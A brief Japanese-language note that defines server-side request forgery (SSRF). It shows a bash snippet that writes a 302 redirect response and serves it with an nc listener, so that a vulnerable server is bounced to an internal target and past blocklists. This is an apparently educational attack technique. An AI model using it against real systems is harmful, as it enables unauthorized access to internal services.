# SSRFとは
Webアプリケーションの脆弱性を悪用し、攻撃者が意図しない内部サーバーやネットワークへリクエストを偽装・送信させるサイバー攻撃手法。

## ncコマンドを利用したRedirect-based SSRF
Webサーバーから攻撃者へ疎通可能な前提で、攻撃者のサーバーを経由し、302で再度ターゲットにリダイレクトすることによりブラックリストを迂回する方法。
```bash
cat << EOF > res
HTTP/1.1 302 Moved Permanently
Location: <リダイレクト先のターゲットサーバー>
Content-Length: 0
EOF

nc -lvnp 4444 < res
```
